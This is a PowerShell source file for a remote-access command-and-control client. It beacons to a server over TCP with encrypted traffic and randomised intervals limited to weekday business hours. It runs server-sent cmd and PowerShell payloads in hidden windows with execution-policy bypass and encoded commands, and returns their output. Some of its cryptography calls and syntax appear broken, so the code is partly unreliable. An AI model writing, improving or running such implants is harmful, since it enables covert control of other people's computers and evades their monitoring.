# Globals
$global:beaconIntervalInstance = $null
$global:logStream = $null
$global:startTime = Get-Date
$global:exitProcess = $false
$global:LOGGING = $true
$global:CVER = "0.2.0"
$global:TYPE = "ps"
$global:CHUNK_SIZE = 1024
$global:SERVER_ADDRESS = 'localhost'
$global:SERVER_PORT = 54678
$global:MAX_RETRIES = 5
$global:RETRY_INTERVALS = @(10000, 30000, 60000, 120000, 240000, 360000)
$global:BEACON_MIN_INTERVAL = 300000  # 5 minutes
$global:BEACON_MAX_INTERVAL = 2700000  # 45 minutes
$global:client = $null

# Create a writable stream for logging
if ($global:LOGGING) {
    $global:logStream = [System.IO.StreamWriter]::new("logs\client.log", $true)
}

# Log it
function Log-It {
    param ([string]$message)
    if ($global:LOGGING -and $global:logStream) {
        $timestamp = (Get-Date).ToString("o")
        $global:logStream.WriteLine("[$timestamp] $message")
    }
}

# Clean up resources on exit
function Cleanup {
    Log-It "Received SIGINT, shutting down gracefully"
    if ($global:client) {
        $global:client.Close()
    }
    $global:exitProcess = $true
    Exit
}

# Trap Ctrl+C (SIGINT) to cleanup
trap {
    Cleanup
}

# Get session ID
function Get-SessionId {
    $ipAddress = $global:client.Client.RemoteEndPoint.Address.ToString()
    $sum = $ipAddress.Split('.') | ForEach-Object { [int]$_ } | Measure-Object -Sum | Select-Object -ExpandProperty Sum
    $sessionId = [BitConverter]::ToString((New-Object Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$ipAddress<>$sum"))).Replace("-", "").Substring(0, 32)
    return $sessionId
}

# Encrypt data
function Encrypt-Data {
    param (
        [string]$data,
        [string]$sharedKey
    )
    $salt = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(16)
    $key = [System.Security.Cryptography.Pbkdf2]::DeriveKey([System.Text.Encoding]::UTF8.GetBytes($sharedKey), $salt, 200000, 32, 'SHA512')
    $iv = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(12)
    $cipher = [System.Security.Cryptography.AesGcm]::new($key)
    $encryptedData = [System.Security.Cryptography.CipherStream]::new($cipher, $iv)
    $encryptedData.Write([System.Text.Encoding]::UTF8.GetBytes($data))
    $encryptedData.FlushFinalBlock()
    $authTag = $cipher.GetAuthTag()
    return "{0}:{1}:{2}:{3}" -f ([Convert]::ToBase64String($salt)), ([Convert]::ToBase64String($iv)), ([Convert]::ToBase64String($authTag)), ([Convert]::ToBase64String($encryptedData))
}

# Decrypt data
function Decrypt-Data {
    param (
        [string]$encrypted,
        [string]$sharedKey
    )
    $parts = $encrypted -split ':'
    $salt = [Convert]::FromBase64String($parts[0])
    $iv = [Convert]::FromBase64String($parts[1])
    $authTag = [Convert]::FromBase64String($parts[2])
    $encryptedData = [Convert]::FromBase64String($parts[3])
    $key = [System.Security.Cryptography.Pbkdf2]::DeriveKey([System.Text.Encoding]::UTF8.GetBytes($sharedKey), $salt, 200000, 32, 'SHA512')
    $cipher = [System.Security.Cryptography.AesGcm]::new($key)
    $cipher.SetAuthTag($authTag)
    $decryptedData = [System.Security.Cryptography.CipherStream]::new($cipher, $iv)
    $decryptedData.Write($encryptedData)
    $decryptedData.FlushFinalBlock()
    return [System.Text.Encoding]::UTF8.GetString($decryptedData)
}

# Get retry interval
function Get-RetryInterval {
    param ([int]$retries)
    return if ($retries -lt $global:RETRY_INTERVALS.Length) { $global:RETRY_INTERVALS[$retries] } else { 0 }
}

# Send command
function Send-Command {
    param ([hashtable]$response)
    $sessionId = Get-SessionId
    $encrypted = Encrypt-Data -data (ConvertTo-Json -InputObject $response) -sharedKey $sessionId
    if ($encrypted.Length -ge $global:CHUNK_SIZE) {
        while ($encrypted.Length -gt 0) {
            $chunk = $encrypted.Substring(0, $global:CHUNK_SIZE)
            $encrypted = $encrypted.Substring($global:CHUNK_SIZE)
            if ($encrypted.Length -eq 0) {
                $chunk += "--END--"
            }
            Log-It "Sent Chunk: $chunk"
            $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($chunk))
        }
    } else {
        Log-It "Sent Data: $encrypted"
        $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($encrypted))
    }
}

# Send beacon
function Send-Beacon {
    Send-Command -response @{ response = @{ beacon = $true; version = $global:CVER; type = $global:TYPE }}
}

# Sleep function
function Sleep-Async {
    param ([int]$ms)
    Start-Sleep -Milliseconds $ms
}

# UTF8 to UTF16
function Utf8To16 {
    param ([string]$str)
    $buffer = New-Object byte[] ($str.Length * 2)
    for ($i = 0; $i -lt $str.Length; $i++) {
        [System.BitConverter]::GetBytes([int][char]$str[$i]).CopyTo($buffer, $i * 2)
    }
    return $buffer
}

# Run command
function Run-Command {
    param (
        [string]$command,
        [string]$payload,
        [bool]$isFile = $false
    )
    try {
        if (-not $command) {
            throw "No command provided."
        }
        if ($command -notin @('cmd', 'ps')) {
            throw "Unsupported command."
        }
        $argus = @()
        switch ($command) {
            'cmd' {
                if ($payload -match '[;&]') {
                    throw "Invalid characters in payload."
                }
                $argus = @('/c', $payload)
                $command = "cmd.exe"
            }
            'ps' {
                $argus = @('-NonInteractive', '-NoLogo', '-NoProfile', '-WindowStyle', 'hidden', '-ExecutionPolicy', 'Bypass')
                if ($isFile) {
                    $argus += @('-File', $payload)
                } else {
                    $encodedCmd = [Convert]::ToBase64String((Utf8To16 -str $payload))
                    $argus += @('-EncodedCommand', $encodedCmd)
                }
                $command = "powershell.exe"
            }
        }
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $process.StartInfo.FileName = $command
        $process.StartInfo.Arguments = $argus -join " "
        $process.StartInfo.RedirectStandardOutput = $true
        $process.StartInfo.RedirectStandardError = $true
        $process.StartInfo.UseShellExecute = $false
        $process.StartInfo.CreateNoWindow = $true
        $process.Start() | Out-Null
        $output = $process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd()
        $process.WaitForExit()
        if ($process.ExitCode -ne 0) {
            throw "Command failed with code $($process.ExitCode). Error output: $output"
        }
        return $output.Trim()
    } catch {
        throw "Failed to execute command: $_"
    }
}

# Format time
function Format-Time {
    param ([int]$milliseconds)
    $totalSeconds = [int]($milliseconds / 1000)
    $days = [int]($totalSeconds / 86400)
    $hours = [int](($totalSeconds % 86400) / 3600)
    $minutes = [int](($totalSeconds % 3600) / 60)
    $seconds = $totalSeconds % 60
    return "$days`d $hours`h $minutes`m $seconds`s"
}

# Get uptime
function Get-Uptime {
    $currentTime = Get-Date
    $uptimeMillis = ($currentTime - $global:startTime).TotalMilliseconds
    return Format-Time -milliseconds $uptimeMillis
}

# Parse action
function Parse-Action {
    param ([string]$action)
    try {
        $parts = $action.Trim() -split ' +(?=(?:[^"]*"[^"]*")*[^"]*$)'  # Split by whitespace but ignore spaces within double quotes
        $command = $parts[0]
        $properties = $parts[1..($parts.Length - 1)]
        
        Log-It "Command: $command - Properties: $($properties -join ' ')"
        
        if ($command -eq 'ps' -or $command -eq 'cmd') {
            $payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($properties[0]))
            $result = Run-Command -command $command -payload $payload
            Send-Command -response @{ response = @{ data = $result }}
        }
        elseif ($command -eq 'up') {
            $uptime = Get-Uptime
            Send-Command -response @{ response = @{ data = $uptime }}
        }
        elseif ($command -eq 'die') {
            $global:exitProcess = $true
            Exit
        }
        else {
            throw "Unknown command: $command"
        }
    }
    catch {
        Send-Command -response @{ response = @{ error = "Error: $_" }}
    }
}

# Connect to server function
function Connect-To-Server {
    try {
        $global:client = New-Object System.Net.Sockets.TcpClient
        $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
        
        Log-It "Client $($global:CVER) connected."
        Send-Beacon
        
        # Set random beacon interval
        $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
        $global:beaconIntervalInstance = [System.Timers.Timer]::new($beaconInterval)
        $global:beaconIntervalInstance.AutoReset = $true
        $global:beaconIntervalInstance.Elapsed += {
            $now = Get-Date
            $day = $now.DayOfWeek.value__
            $hour = $now.Hour
            # Check if the current day is Monday through Friday (1-5) and the hour is between 7 AM and 7 PM (inclusive)
            if ($day -ge 1 -and $day -le 5 -and $hour -ge 7 -and $hour -le 19) {
                Send-Beacon
            }
        }
        $global:beaconIntervalInstance.Start()
        
        # Listen for server commands
        $stream = $global:client.GetStream()
        $reader = [System.IO.StreamReader]::new($stream)
        
        while ($true) {
            $data = $reader.ReadLine()
            if ($data -ne $null) {
                Log-It "Received Data: $data"
                $action = Decrypt-Data -encrypted $data
                if ($action) {
                    Parse-Action -action $action
                }
            }
        }
    }
    catch {
        Log-It "Exception: $_"
    }
}

# Start client
Connect-To-Server